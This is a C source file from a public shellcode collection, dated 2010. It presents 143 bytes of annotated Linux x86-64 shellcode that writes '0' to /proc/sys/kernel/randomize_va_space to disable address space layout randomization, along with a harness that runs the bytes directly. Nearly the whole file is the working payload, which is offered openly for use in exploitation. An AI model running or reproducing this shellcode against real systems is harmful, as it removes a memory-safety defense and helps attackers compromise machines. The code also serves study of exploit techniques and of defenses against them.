/*
Title:  Linux/x86-64 - Disable ASLR Security - 143 bytes
Date:   2010-06-17
Tested: Archlinux x86_64 k2.6.33

Author: Jonathan Salwan
Web:    http://shell-storm.org | http://twitter.com/jonathansalwan

! Dtabase of shellcodes http://www.shell-storm.org/shellcode/


Description:
============
 Address space layout randomization (ASLR) is a computer security technique
 which involves randomly arranging the positions of key data areas, usually
 including the base  of the executable and position of libraries, heap, and
 stack, in a process's address space.

 This shellcode disables the ASLR.

*/

#include <stdio.h>


char *SC =
           /*  open("/proc/sys/kernel/randomize_va_space", O_WRONLY|O_CREAT|O_APPEND, 0644) */

           "\x48\x31\xd2"                                // xor    %rdx,%rdx
           "\x48\xbb\xff\xff\xff\xff\xff\x61\x63\x65"    // mov    $0x656361ffffffffff,%rbx
           "\x48\xc1\xeb\x28"                            // shr    $0x28,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x7a\x65\x5f\x76\x61\x5f\x73\x70"    // mov    $0x70735f61765f657a,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x2f\x72\x61\x6e\x64\x6f\x6d\x69"    // mov    $0x696d6f646e61722f,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x73\x2f\x6b\x65\x72\x6e\x65\x6c"    // mov    $0x6c656e72656b2f73,%rbx
           "\x53"                                        // push   %rbx
           "\x48\xbb\x2f\x70\x72\x6f\x63\x2f\x73\x79"    // mov    $0x79732f636f72702f,%rbx
           "\x53"                                        // push   %rbx
           "\x48\x89\xe7"                                // mov    %rsp,%rdi
           "\x66\xbe\x41\x04"                            // mov    $0x441,%si
           "\x66\xba\xa4\x01"                            // mov    $0x1a4,%dx
           "\x48\x31\xc0"                                // xor    %rax,%rax
           "\xb0\x02"                                    // mov    $0x2,%al
           "\x0f\x05"                                    // syscall


           /* write(3, "0\n", 2) */

           "\x48\xbf\xff\xff\xff\xff\xff\xff\xff\x03"    // mov    $0x3ffffffffffffff,%rdi
           "\x48\xc1\xef\x38"                            // shr    $0x38,%rdi
           "\x48\xbb\xff\xff\xff\xff\xff\xff\x30\x0a"    // mov    $0xa30ffffffffffff,%rbx
           "\x48\xc1\xeb\x30"                            // shr    $0x30,%rbx
           "\x53"                                        // push   %rbx
           "\x48\x89\xe6"                                // mov    %rsp,%rsi
           "\x48\xba\xff\xff\xff\xff\xff\xff\xff\x02"    // mov    $0x2ffffffffffffff,%rdx
           "\x48\xc1\xea\x38"                            // shr    $0x38,%rdx
           "\x48\x31\xc0"                                // xor    %rax,%rax
           "\xb0\x01"                                    // mov    $0x1,%al
           "\x0f\x05"                                    // syscall


           /* _exit(0) */

           "\x48\x31\xff"                                // xor    %rdi,%rdi
           "\x48\x31\xc0"                                // xor    %rax,%rax
           "\xb0\x3c"                                    // mov    $0x3c,%al
           "\x0f\x05";                                   // syscall


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(SC));
        (*(void(*)()) SC)();
return 0;
}